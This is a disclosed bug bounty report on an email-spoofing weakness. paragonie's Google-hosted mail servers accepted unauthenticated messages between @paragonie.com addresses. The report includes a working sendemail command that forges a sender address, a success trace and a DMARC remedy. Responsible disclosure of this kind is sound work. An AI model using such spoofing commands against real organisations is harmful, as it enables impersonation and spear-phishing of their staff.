# SMTP server allows anonymous relay from internal addresses to internal addresses

## Report Details
- **Report ID**: 144385
- **URL**: https://hackerone.com/reports/144385
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-12T18:04:06.387Z
- **Disclosed**: 2017-10-16T05:51:25.288Z

## Reporter
- **Username**: phenix
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: paragonie

## Vulnerability Information
Hello,

## Issue descripton
your incoming SMTP servers, provided by google , seems to be accepting without authentication mails from addresses `@paragonie.com` and destined for addresses `@paragonie.com`.

This can greatly ease spear-phishing attacks, as users usually put much trust into emails coming from their own domain name, let alone people they actually know.
For instance, an attacker could craft an email impersonating your CEO or your IT dept. and asking to open a malicious link or attachment, then send it to some of your users by leveraging this vulnerabilty.

## Issue reproduction
using the sendemail script (http://caspian.dotconf.net/menu/Software/SendEmail/) :
`sendemail -s alt1.aspmx.l.google.com:25 -o message-file=mail2.txt -t security@paragonie.com -f scott@paragonie.com -u "security testing of mail relay" -vvv`

If you will, I can also reproduce the issue at your request, with any "from:" and "to:" addresses that you like.

## Trace output
As this trace shows, I was able to send an email from scott@paragonie.com to security@paragonie.com, without authentication.
```
Jun 12 19:08:48 vps289445 sendemail[2081]: INFO => Sending:     MAIL FROM:<scott@paragonie.com>
Jun 12 19:08:48 vps289445 sendemail[2081]: SUCCESS => Received:         250 2.1.0 OK s12si11327788lfe.119 - gsmtp
Jun 12 19:08:48 vps289445 sendemail[2081]: INFO => Sending:     RCPT TO:<security@paragonie.com>
Jun 12 19:08:48 vps289445 sendemail[2081]: SUCCESS => Received:         250 2.1.5 OK s12si11327788lfe.119 - gsmtp
Jun 12 19:08:48 vps289445 sendemail[2081]: INFO => Sending:     DATA
Jun 12 19:08:48 vps289445 sendemail[2081]: SUCCESS => Received:         354  Go ahead s12si11327788lfe.119 - gsmtp
Jun 12 19:08:48 vps289445 sendemail[2081]: INFO => Sending message body
Jun 12 19:08:48 vps289445 sendemail[2081]: Setting content-type: text/plain
Jun 12 19:08:48 vps289445 sendemail[2081]: SUCCESS => Received:         250 2.0.0 OK 1465751328 s12si11327788lfe.119 - gsmtp
Jun 12 19:08:48 vps289445 sendemail[2081]: Generating a detailed exit message
Jun 12 19:08:48 vps289445 sendemail[2081]: Email was sent successfully!  From: <scott@paragonie.com> To: <security@paragonie.com> Subject: [security testing of mail relay] Server: [alt1.aspmx.l.google.com:25]
```

## Recommendation
Authentication shall be requested for incoming emails from internal `@paragonie.com` email addresses, especially when they come from untrusted networks such as Internet.

More information on how to fix this vulnerability with DMARC records can be found here:
https://support.google.com/mail/answer/2451690

Best regards.


## Attachments
No attachments
